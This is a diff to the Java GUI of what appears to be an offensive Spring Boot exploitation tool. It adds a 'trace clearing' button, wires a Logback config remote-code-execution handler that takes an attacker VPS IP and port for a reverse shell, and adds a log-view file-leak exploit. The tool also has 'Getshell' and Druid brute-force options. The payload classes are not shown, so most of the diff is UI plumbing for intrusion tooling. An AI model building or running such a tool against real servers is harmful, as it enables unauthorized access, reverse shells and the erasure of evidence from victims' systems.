@@ -163,7 +163,7 @@ public class springboot_vul extends Application {
                                 throw new RuntimeException(e);
                         }
                 });
-                Expbtn.setPrefSize(80,60);
+                Expbtn.setPrefSize(60,60);
                 Button Shellbtn = new Button("Getshell");
                 Shellbtn.setOnAction(event -> {
                         try {
@@ -172,10 +172,19 @@ public class springboot_vul extends Application {
                                 throw new RuntimeException(e);
                         }
                 });
-                Shellbtn.setPrefSize(80,60);
-                HBox btnBox = new HBox(10);
-                btnBox.getChildren().addAll(Expbtn,Shellbtn);
-                HBox.setMargin(Expbtn,new Insets(0,0,0,20));
+                Shellbtn.setPrefSize(70,60);
+                Button Delbtn = new Button("痕迹清除");
+                Delbtn.setOnAction(event -> {
+                        try {
+                                handlerDelData(Addrtf);
+                        } catch (IOException e) {
+                                throw new RuntimeException(e);
+                        }
+                });
+                Delbtn.setPrefSize(70,60);
+                HBox btnBox = new HBox(5);
+                btnBox.getChildren().addAll(Expbtn,Shellbtn,Delbtn);
+                HBox.setMargin(Expbtn,new Insets(0,0,0,0));
 
                 // 地址框和漏洞列表框
                 HBox addrBox = new HBox(10);
@@ -261,7 +270,7 @@ public class springboot_vul extends Application {
         }
 
         public void handlerAllScan(String address){
-
+                showAlertEmpty("暂时未开启全部扫描功能，防止批量造成服务器崩溃服务停止");
         }
         public void handlerScanVul(String address) throws IOException {
                 final AtomicReference<Double> curlines = new AtomicReference<>(0.0);
@@ -591,8 +600,39 @@ public class springboot_vul extends Application {
         public void handlerMysqlJdbcRCE(String address,String command){
 
         }
-        public void handlerLoggingLogbackRCE(String address,String command){
+        public void handlerLoggingLogbackRCE(String address,String vpsIP,String vpsPORT){
+                consoleOutput.getChildren().clear();
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        if (vpsIP.isEmpty() && vpsPORT.isEmpty()) {
+                                showAlertEmpty("反弹vps的IP和端口为空！");
+                        } else {
+                                LoggingConfigRCE lr = new LoggingConfigRCE(address,vpsIP,vpsPORT);
+                                lr.Exp(new ResultCallback() {
+                                        @Override
+                                        public void onResult(String result) {
+                                                Platform.runLater(() -> {
+                                                        // 输出其他内容到控制台
+                                                        Text text = new Text(result + "\n");
+                                                        consoleOutput.getChildren().add(text);
+                                                        // 自动滚动到最新内容
+                                                        scrollPane.setVvalue(1.0);
+                                                });
+                                        }
 
+                                        @Override
+                                        public void onComplete() {
+                                        }
+                                });
+                        }
+                }
 
         }
         public void handlerLoggingGroovyRCE(String address,String vpsIP,String vpsPORT){
@@ -734,6 +774,37 @@ public class springboot_vul extends Application {
                         });
                 }
         }
+        public void handlerLogViewFile(String address,String filename){
+                consoleOutput.getChildren().clear();
+                // 暂无证书模块，待设置
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        LogViewFileLeak lf = new LogViewFileLeak(address,filename);
+                        lf.Exp(new ResultCallback() {
+                                @Override
+                                public void onResult(String result) {
+                                        Platform.runLater(() -> {
+                                                // 输出其他内容到控制台
+                                                Text text = new Text(result + "\n");
+                                                consoleOutput.getChildren().add(text);
+                                                // 自动滚动到最新内容
+                                                scrollPane.setVvalue(1.0);
+                                        });
+                                }
+
+                                @Override
+                                public void onComplete() {
+                                }
+                        });
+                }
+        }
         public void handleAllVulnerabilities(String address,String command){
 
         }
@@ -754,6 +825,7 @@ public class springboot_vul extends Application {
                         if (!address.startsWith("http://") && !address.startsWith("https://")) {
                                 address = "http://" + address;
                         }
+                        System.out.println(Vulvalue);
                         switch (Vulvalue){
                                 case -1:
                                         showAlertEmpty("你踏马还没选择漏洞类型呢！");
@@ -785,7 +857,7 @@ public class springboot_vul extends Application {
                                         handlerMysqlJdbcRCE(address, command);
                                         break;
                                 case 14:
-                                        handlerLoggingLogbackRCE(address, command);
+                                        handlerLoggingLogbackRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 15:
                                         handlerLoggingGroovyRCE(address,vpsIP,vpsPort);
@@ -810,11 +882,13 @@ public class springboot_vul extends Application {
 
         }
         public void handlerExp(TextField addr,TextField args,TextField cmdobj,TextField vpsobj,TextField portobj) throws IOException {
+                boolean isPoc = false;
                 String address = addr.getText();
                 String arg = args.getText();
                 String command = cmdobj.getText();
                 String vpsIP = vpsobj.getText();
                 String vpsPort = portobj.getText();
+                String filename = "";
                 if (address.isEmpty()) {
                         showAlertEmpty("地址为空！");
                 } else {
@@ -824,7 +898,7 @@ public class springboot_vul extends Application {
                                         break;
                                 case 0:
                                         handlerAllScan(address);
-
+                                        break;
                                 case 1:
                                         handlerScanVul(address);
                                         break;
@@ -864,10 +938,12 @@ public class springboot_vul extends Application {
                                         handlerH2DatabaseJNDIRCE(address, command);
                                         break;
                                 case 13:
-                                        handlerMysqlJdbcRCE(address, command);
+//                                        handlerMysqlJdbcRCE(address, command);
+                                        showAlertEmpty("暂时没有写这里，直接getshell");
                                         break;
                                 case 14:
-                                        handlerLoggingLogbackRCE(address, command);
+//                                        handlerLoggingLogbackRCE(address,vpsIP,vpsPort);
+                                        showAlertEmpty("暂时没有写这里，直接getshell");
                                         break;
                                 case 15:
                                         showAlertEmpty("暂时没有写这里，直接getshell");
@@ -882,6 +958,9 @@ public class springboot_vul extends Application {
                                 case 18:
                                         handlerDruidBruteForce(address);
                                         break;
+                                case 19:
+                                        handlerLogViewFile(address,filename);
+                                        break;
                                 default:
                                         showAlertEmpty("你踏马还没选择漏洞类型呢！");
                                         break;
@@ -891,6 +970,14 @@ public class springboot_vul extends Application {
 
         public void handlerDelData(TextField addr) throws IOException{
                 // 痕迹清除
+                String address = addr.getText();
+                if (address.isEmpty()) {
+                        showAlertEmpty("地址为空！");
+                } else {
+                        switch (Vulvalue) {
+
+                        }
+                }
 
 
         }
